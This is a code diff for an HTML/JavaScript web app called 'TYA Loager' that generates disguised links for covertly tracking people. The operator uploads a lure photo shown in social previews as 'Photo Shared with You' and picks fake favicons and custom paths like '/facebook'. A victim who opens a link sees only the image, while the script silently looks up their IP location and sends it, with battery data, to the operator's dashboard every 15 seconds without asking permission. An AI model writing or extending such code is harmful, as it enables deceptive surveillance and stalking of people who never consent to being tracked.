@@ -5,33 +5,32 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>TYA Loager</title>
 
-    <!-- Open Graph for social media preview (the "real image" illusion) -->
+    <!-- Open Graph for social preview -->
     <meta property="og:title" content="Photo Shared with You" />
-    <meta property="og:description" content="Tap to view location details" />
+    <meta property="og:description" content="Tap to view location" />
     <meta property="og:image" id="og-image" content="/api/image" />
     <meta property="og:type" content="website" />
     <meta property="og:url" id="og-url" content="" />
     <meta property="og:image:width" content="1200" />
     <meta property="og:image:height" content="630" />
 
-    <!-- Dynamic favicon (set via JS) -->
+    <!-- Dynamic favicon -->
     <link id="dynamic-favicon" rel="icon" href="/api/favicon/i" type="image/jpeg" />
 
     <!-- Leaflet CSS -->
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
 
     <style>
-        /* ── RESET & BASE ── */
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
         }
         :root {
-            --bg-color: #0f172a;
-            --card-bg: #1e293b;
-            --text-primary: #f8fafc;
-            --text-secondary: #94a3b8;
+            --bg: #0f172a;
+            --card: #1e293b;
+            --text: #f8fafc;
+            --text2: #94a3b8;
             --accent: #6366f1;
             --accent-hover: #4f46e5;
             --success: #10b981;
@@ -41,9 +40,9 @@
             --shadow: 0 8px 30px rgba(0, 0, 0, 0.4);
         }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: var(--bg-color);
-            color: var(--text-primary);
+            font-family: 'Segoe UI', sans-serif;
+            background: var(--bg);
+            color: var(--text);
             overflow-x: hidden;
             min-height: 100vh;
         }
@@ -55,27 +54,25 @@
             opacity: 0.5;
             pointer-events: none;
         }
-
-        /* ── SCROLLBAR ── */
         ::-webkit-scrollbar {
             width: 6px;
         }
         ::-webkit-scrollbar-track {
-            background: var(--bg-color);
+            background: var(--bg);
         }
         ::-webkit-scrollbar-thumb {
             background: var(--accent);
             border-radius: 8px;
         }
 
-        /* ── TOAST ── */
+        /* Toast */
         #toast {
             position: fixed;
             bottom: 30px;
             left: 50%;
             transform: translateX(-50%) translateY(100px);
-            background: var(--card-bg);
-            color: var(--text-primary);
+            background: var(--card);
+            color: var(--text);
             padding: 16px 32px;
             border-radius: 12px;
             border: 1px solid var(--border);
@@ -96,7 +93,7 @@
             pointer-events: auto;
         }
 
-        /* ── DASHBOARD ── */
+        /* Dashboard */
         #dashboard-view {
             padding: 20px;
             max-width: 1300px;
@@ -119,13 +116,13 @@
             margin: 0;
         }
         .brand-sub {
-            color: var(--text-secondary);
+            color: var(--text2);
             font-size: 0.9rem;
             margin-top: 4px;
             letter-spacing: 2px;
         }
 
-        /* ── UPLOAD SECTIONS ── */
+        /* Upload Grid */
         .upload-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
@@ -138,7 +135,7 @@
             }
         }
         .upload-card {
-            background: var(--card-bg);
+            background: var(--card);
             border-radius: var(--radius);
             padding: 20px;
             border: 1px solid var(--border);
@@ -156,7 +153,7 @@
             gap: 8px;
         }
         .upload-card p {
-            color: var(--text-secondary);
+            color: var(--text2);
             font-size: 0.8rem;
             margin-bottom: 12px;
         }
@@ -194,10 +191,6 @@
             transform: scale(1.08);
             border-color: var(--accent);
         }
-        .upload-card .preview-row .favicon-grid img.selected {
-            border-color: var(--accent);
-            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.4);
-        }
         .upload-btn {
             background: var(--accent);
             color: #fff;
@@ -217,7 +210,7 @@
             display: none;
         }
 
-        /* ── ACTION BAR ── */
+        /* Action Bar */
         .action-bar {
             display: flex;
             gap: 14px;
@@ -270,18 +263,18 @@
             background: #475569;
         }
 
-        /* ── USER CARDS ── */
+        /* User Cards */
         .grid-container {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
             gap: 20px;
         }
         .card {
-            background: var(--card-bg);
+            background: var(--card);
             border-radius: var(--radius);
             padding: 20px;
             border: 1px solid var(--border);
-            transition: border-color 0.3s, transform 0.2s;
+            transition: all 0.3s;
         }
         .card:hover {
             border-color: var(--accent);
@@ -299,6 +292,7 @@
             font-weight: 700;
             font-size: 1.1rem;
             color: var(--accent);
+            word-break: break-all;
         }
         .card-header .favicon-badge img {
             width: 28px;
@@ -307,7 +301,6 @@
             object-fit: cover;
             border: 1px solid var(--border);
         }
-
         .status-badge {
             background: rgba(16, 185, 129, 0.15);
             color: var(--success);
@@ -359,7 +352,7 @@
         }
         .card .info-label {
             font-size: 0.6rem;
-            color: var(--text-secondary);
+            color: var(--text2);
             text-transform: uppercase;
             letter-spacing: 0.5px;
         }
@@ -389,7 +382,7 @@
         }
         .card .settings-row label {
             font-size: 0.75rem;
-            color: var(--text-secondary);
+            color: var(--text2);
             font-weight: 600;
             display: flex;
             flex-direction: column;
@@ -399,9 +392,9 @@
         }
         .card .settings-row input,
         .card .settings-row select {
-            background: var(--bg-color);
+            background: var(--bg);
             border: 1px solid var(--border);
-            color: var(--text-primary);
+            color: var(--text);
             padding: 6px 10px;
             border-radius: 6px;
             font-size: 0.85rem;
@@ -411,9 +404,6 @@
         .card .settings-row input:focus,
         .card .settings-row select:focus {
             border-color: var(--accent);
-        }
-        .card .settings-row select option {
-            background: var(--bg-color);
         }
         .card .settings-row .favicon-select {
             display: flex;
@@ -448,26 +438,26 @@
             justify-content: center;
             padding: 8px 12px;
             font-size: 0.8rem;
-            min-width: 80px;
+            min-width: 70px;
         }
 
         .empty-state {
             text-align: center;
-            color: var(--text-secondary);
+            color: var(--text2);
             grid-column: 1 / -1;
             padding: 60px 20px;
         }
         .empty-state h3 {
             font-size: 1.6rem;
             margin-bottom: 10px;
-            color: var(--text-primary);
+            color: var(--text);
         }
         .empty-state .icon {
             font-size: 4rem;
             margin-bottom: 16px;
         }
 
-        /* ── TRACKER VIEW ── */
+        /* Tracker View */
         #tracker-view {
             display: none;
             position: fixed;
@@ -521,7 +511,6 @@
             font-size: 0.9rem;
         }
 
-        /* ── RESPONSIVE ── */
         @media (max-width: 640px) {
             .brand-name {
                 font-size: 1.8rem;
@@ -554,24 +543,21 @@
     <div id="dashboard-view">
         <div class="header">
             <h1 class="brand-name">TYA Loager</h1>
-            <p class="brand-sub">📍 Live Tracker · Custom Links · Smart Favicons</p>
+            <p class="brand-sub">📍 Live Tracker · Custom URLs · Offline Last Location</p>
         </div>
 
         <!-- Upload Grid -->
         <div class="upload-grid">
-            <!-- OG Image Upload -->
             <div class="upload-card">
                 <h3>🖼️ Shared Image (OG)</h3>
                 <p>This image appears when you share the link on social media.</p>
                 <label for="og-upload" class="upload-btn">📤 Upload Image</label>
                 <input type="file" id="og-upload" class="file-input" accept="image/*" />
                 <div class="preview-row">
-                    <span style="font-size:0.8rem;color:var(--text-secondary);">Preview:</span>
+                    <span style="font-size:0.8rem;color:var(--text2);">Preview:</span>
                     <img id="og-preview" src="/api/image" alt="OG Preview" />
                 </div>
             </div>
-
-            <!-- Favicon Upload -->
             <div class="upload-card">
                 <h3>🎯 Favicon Set (4 Options)</h3>
                 <p>Upload 4 favicon images: <strong>i.jpg, f.jpg, w.jpg, g.jpg</strong></p>
@@ -586,7 +572,7 @@
                     <input type="file" id="fav-g" class="file-input" accept="image/*" />
                 </div>
                 <div class="preview-row">
-                    <span style="font-size:0.8rem;color:var(--text-secondary);">Current:</span>
+                    <span style="font-size:0.8rem;color:var(--text2);">Current:</span>
                     <div class="favicon-grid" id="favicon-previews">
                         <img src="/api/favicon/i" alt="i" data-name="i" />
                         <img src="/api/favicon/f" alt="f" data-name="f" />
@@ -610,8 +596,8 @@
                 <div class="icon">📡</div>
                 <h3>No Active Targets</h3>
                 <p>Upload your images, then click "Generate New Link" to start tracking.</p>
-                <p style="font-size:0.85rem;color:var(--text-secondary);margin-top:8px;">
-                    Each link can have a custom URL and a unique favicon.
+                <p style="font-size:0.85rem;color:var(--text2);margin-top:8px;">
+                    Each link gets a custom URL (e.g., /facebook) and a favicon.
                 </p>
             </div>
         </div>
@@ -635,19 +621,20 @@
         //  CONFIG
         // ──────────────────────────────────────────────────────────────
         const FAVICON_NAMES = ['i', 'f', 'w', 'g'];
-        const DEFAULT_OG = '/api/image';
+        const OFFLINE_THRESHOLD = 30000; // 30 seconds
 
         // ──────────────────────────────────────────────────────────────
         //  ROUTING
         // ──────────────────────────────────────────────────────────────
         const path = window.location.pathname;
         const isTracker = path.startsWith('/track/');
-        const userId = isTracker ? decodeURIComponent(path.split('/')[2]) : null;
+        // Extract the custom path (everything after /track/)
+        const customPath = isTracker ? decodeURIComponent(path.substring(7)) : null;
 
         document.getElementById('og-url').content = window.location.href;
 
-        if (isTracker && userId) {
-            initTracker(userId);
+        if (isTracker && customPath) {
+            initTracker(customPath);
         } else {
             initDashboard();
         }
@@ -657,7 +644,6 @@
         // ──────────────────────────────────────────────────────────────
         let trackedUsers = [];
         let mapInstances = {};
-        let currentFavicons = {};
 
         // ──────────────────────────────────────────────────────────────
         //  DASHBOARD
@@ -677,9 +663,7 @@
         }
 
         function refreshPreviews() {
-            // OG preview
             document.getElementById('og-preview').src = '/api/image?' + Date.now();
-            // Favicon previews
             FAVICON_NAMES.forEach(name => {
                 const img = document.querySelector(`#favicon-previews img[data-name="${name}"]`);
                 if (img) img.src = '/api/favicon/' + name + '?' + Date.now();
@@ -688,7 +672,6 @@
 
         // ─── Upload Handlers ──────────────────────────────────────────
         function setupUploads() {
-            // OG image
             document.getElementById('og-upload').addEventListener('change', async function(e) {
                 const file = e.target.files[0];
                 if (!file) return;
@@ -698,7 +681,6 @@
                 e.target.value = '';
             });
 
-            // Favicons
             FAVICON_NAMES.forEach(name => {
                 const input = document.getElementById('fav-' + name);
                 if (input) {
@@ -706,7 +688,7 @@
                         const file = e.target.files[0];
                         if (!file) return;
                         await uploadFile('/api/favicon/' + name, file, '✅ Favicon "' + name +
-                        '.jpg" uploaded!');
+                            '.jpg" uploaded!');
                         const img = document.querySelector(`#favicon-previews img[data-name="${name}"]`);
                         if (img) img.src = '/api/favicon/' + name + '?' + Date.now();
                         e.target.value = '';
@@ -754,24 +736,32 @@
                         <div class="icon">📡</div>
                         <h3>No Active Targets</h3>
                         <p>Upload your images, then click "Generate New Link" to start tracking.</p>
-                        <p style="font-size:0.85rem;color:var(--text-secondary);margin-top:8px;">
-                            Each link gets a custom URL and you can pick a favicon for each.
+                        <p style="font-size:0.85rem;color:var(--text2);margin-top:8px;">
+                            Each link gets a custom URL (e.g., /facebook) and a favicon.
                         </p>
                     </div>
                 `;
                 return;
             }
 
+            const now = Date.now();
             const sorted = [...trackedUsers].sort((a, b) => {
-                const aLive = a.lat && a.lng ? 1 : 0;
-                const bLive = b.lat && b.lng ? 1 : 0;
+                // Sort by online status first (live first)
+                const aLive = (a.lat && a.lng && (now - new Date(a.lastUpdate).getTime() < OFFLINE_THRESHOLD)) ? 1 : 0;
+                const bLive = (b.lat && b.lng && (now - new Date(b.lastUpdate).getTime() < OFFLINE_THRESHOLD)) ? 1 : 0;
                 if (aLive !== bLive) return bLive - aLive;
                 return new Date(b.lastUpdate || 0) - new Date(a.lastUpdate || 0);
             });
 
             sorted.forEach(user => {
-                const hasLocation = !!(user.lat && user.lng);
-                const mapUrl = hasLocation ? `https://www.google.com/maps?q=${user.lat},${user.lng}` : '#';
+                const now = Date.now();
+                const isLive = !!(user.lat && user.lng && (now - new Date(user.lastUpdate).getTime() <
+                OFFLINE_THRESHOLD));
+                const hasLastLocation = !!(user.lastLat && user.lastLng);
+                const displayLat = isLive ? user.lat : (user.lastLat || null);
+                const displayLng = isLive ? user.lng : (user.lastLng || null);
+                const hasLocation = !!(displayLat && displayLng);
+                const mapUrl = hasLocation ? `https://www.google.com/maps?q=${displayLat},${displayLng}` : '#';
                 const faviconName = user.favicon || 'i';
                 const customPath = user.customPath || user.id;
 
@@ -785,9 +775,9 @@
                             <span class="favicon-badge">
                                 <img src="/api/favicon/${faviconName}" alt="favicon" />
                             </span>
-                            <span class="status-badge ${hasLocation ? '' : 'offline'}">
+                            <span class="status-badge ${isLive ? '' : 'offline'}">
                                 <div class="status-dot"></div>
-                                ${hasLocation ? 'LIVE' : 'OFFLINE'}
+                                ${isLive ? 'LIVE' : 'OFFLINE'}
                             </span>
                         </div>
                     </div>
@@ -807,8 +797,8 @@
                         </div>
                         ${hasLocation ? `
                         <div class="info-item" style="grid-column:1/-1;">
-                            <div class="info-label">Location</div>
-                            <div class="info-value">${user.lat.toFixed(5)}, ${user.lng.toFixed(5)}</div>
+                            <div class="info-label">${isLive ? 'Current Location' : 'Last Known Location'}</div>
+                            <div class="info-value">${displayLat.toFixed(5)}, ${displayLng.toFixed(5)}</div>
                         </div>
                         ` : ''}
                     </div>
@@ -819,7 +809,7 @@
                         <label>
                             Custom URL
                             <input type="text" id="path-${user.id}" value="${escapeHtml(customPath)}" 
-                                   placeholder="custom-path" />
+                                   placeholder="custom-slug" />
                         </label>
                         <label>
                             Favicon
@@ -857,15 +847,14 @@
                         const map = L.map(mapId, {
                             zoomControl: false,
                             attributionControl: false,
-                            center: [user.lat, user.lng],
+                            center: [displayLat, displayLng],
                             zoom: 14,
                         });
                         L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
                             maxZoom: 19
                         }).addTo(map);
-                        L.marker([user.lat, user.lng]).addTo(map)
-                            .bindPopup(`<b>${escapeHtml(user.id)}</b><br>Battery: ${escapeHtml(user.battery || 'N/A')}`)
-                            .openPopup();
+                        const marker = L.marker([displayLat, displayLng]).addTo(map);
+                        marker.bindPopup(`<b>${escapeHtml(user.id)}</b><br>Battery: ${escapeHtml(user.battery || 'N/A')}<br>${isLive ? '🟢 Online' : '🔴 Offline'}`);
                         mapInstances[mapId] = map;
                         setTimeout(() => map.invalidateSize(), 200);
                     }
@@ -880,13 +869,13 @@
             container.querySelectorAll('img').forEach(img => {
                 img.classList.toggle('active', img.dataset.name === name);
             });
-            // Update the badge
+            // Update badge
             const card = document.getElementById('card-' + userId);
             if (card) {
                 const badge = card.querySelector('.favicon-badge img');
                 if (badge) badge.src = '/api/favicon/' + name + '?' + Date.now();
             }
-            // Save immediately
+            // Save
             saveSettings(userId);
         }
 
@@ -912,7 +901,7 @@
                 const data = await res.json();
                 if (data.success) {
                     showToast('✅ Settings saved for ' + escapeHtml(userId));
-                    // Update the link in the badge
+                    // Update badge
                     const card = document.getElementById('card-' + userId);
                     if (card) {
                         const badge = card.querySelector('.favicon-badge img');
@@ -938,25 +927,23 @@
             }).then(() => {
                 fetchUsers();
                 showToast('✨ New link generated: <strong>' + id + '</strong>');
-                // Auto copy
                 copyLink(id);
             }).catch(err => {
                 showToast('❌ Error: ' + err.message);
             });
         }
 
-        // ─── Copy Link ────────────────────────────────────────────────
+        // ─── Copy Link (uses customPath if set) ──────────────────────
         function copyLink(id) {
-            // Get custom path from the input if available
             const pathInput = document.getElementById('path-' + id);
             const customPath = pathInput ? pathInput.value.trim() : id;
             const link = window.location.origin + '/track/' + encodeURIComponent(customPath || id);
             navigator.clipboard.writeText(link)
-                .then(() => showToast('✅ Link for <strong>' + escapeHtml(id) + '</strong> copied!<br><span style="font-size:0.8rem;color:var(--text-secondary);">' + link +
+                .then(() => showToast('✅ Link for <strong>' + escapeHtml(id) + '</strong> copied!<br><span style="font-size:0.8rem;color:var(--text2);">' + link +
                         '</span>'))
                 .catch(() => {
                     prompt('Copy this link:', link);
-                    showToast('📋 Link copied to clipboard.');
+                    showToast('📋 Link copied.');
                 });
         }
 
@@ -967,7 +954,7 @@
                 const res = await fetch('/api/track/' + id, { method: 'DELETE' });
                 if (res.ok) {
                     fetchUsers();
-                    showToast('🗑️ User ' + escapeHtml(id) + ' deleted.');
+                    showToast('🗑️ User deleted.');
                 } else {
                     showToast('❌ Failed to delete.');
                 }
@@ -986,7 +973,7 @@
                     renderCards();
                     showToast('🗑️ All data cleared.');
                 } else {
-                    showToast('❌ Failed to clear data.');
+                    showToast('❌ Failed to clear.');
                 }
             } catch (err) {
                 showToast('❌ Error: ' + err.message);
@@ -994,9 +981,9 @@
         }
 
         // ──────────────────────────────────────────────────────────────
-        //  TRACKER (User Side) — No location permission needed
+        //  TRACKER (User Side) — No permission needed (IP-based)
         // ──────────────────────────────────────────────────────────────
-        function initTracker(id) {
+        function initTracker(customPath) {
             const trackerView = document.getElementById('tracker-view');
             const img = document.getElementById('target-image');
             const loader = document.getElementById('loader');
@@ -1012,19 +999,39 @@
                 loader.style.display = 'none';
             };
 
-            // Set favicon from user settings (we'll fetch it)
+            // Find user by customPath or ID
             fetch('/api/track')
                 .then(r => r.json())
                 .then(users => {
-                    const user = users.find(u => u.id === id || u.customPath === id);
-                    if (user && user.favicon) {
-                        document.getElementById('dynamic-favicon').href = '/api/favicon/' + user.favicon;
+                    const user = users.find(u => u.customPath === customPath || u.id === customPath);
+                    if (user) {
+                        // Set favicon
+                        if (user.favicon) {
+                            document.getElementById('dynamic-favicon').href = '/api/favicon/' + user.favicon;
+                        }
+                        // Start tracking with this user ID
+                        setTimeout(() => trackUser(user.id), 1500);
+                    } else {
+                        // User not found – create one with this customPath?
+                        // We'll create a new user with ID = customPath and customPath = customPath
+                        const newId = customPath;
+                        fetch('/api/track', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ id: newId, customPath: newId, device: 'Pending', battery: 'N/A',
+                                lat: null, lng: null }),
+                        }).then(() => {
+                            setTimeout(() => trackUser(newId), 1500);
+                        }).catch(() => {
+                            // Fallback: track with ID = customPath anyway
+                            setTimeout(() => trackUser(customPath), 1500);
+                        });
                     }
                 })
-                .catch(() => {});
-
-            // Start tracking after a moment
-            setTimeout(() => trackUser(id), 1500);
+                .catch(() => {
+                    // Fallback: track with customPath as ID
+                    setTimeout(() => trackUser(customPath), 1500);
+                });
         }
 
         async function trackUser(id) {
@@ -1047,7 +1054,7 @@
                 } catch (_) {}
             }
 
-            // ── Location via IP (NO PERMISSION NEEDED) ──
+            // ── Location via IP (NO PERMISSION) ──
             try {
                 const geoRes = await fetch('https://ipapi.co/json/');
                 if (geoRes.ok) {
@@ -1058,7 +1065,6 @@
                     }
                 }
             } catch (_) {
-                // Fallback to ip-api.com
                 try {
                     const fallback = await fetch('https://ip-api.com/json/');
                     if (fallback.ok) {
@@ -1076,7 +1082,6 @@
 
             // ── Keep sending updates every 15s ──
             setInterval(async () => {
-                // Refresh location periodically via IP
                 try {
                     const geoRes = await fetch('https://ipapi.co/json/');
                     if (geoRes.ok) {
@@ -1133,7 +1138,7 @@
         console.log('🚀 TYA Loager v2 loaded.');
         console.log('📍 Path:', path);
         console.log('📡 Tracker mode:', isTracker);
-        if (isTracker) console.log('👤 User ID:', userId);
+        if (isTracker) console.log('👤 Custom path:', customPath);
     </script>
 
 </body>
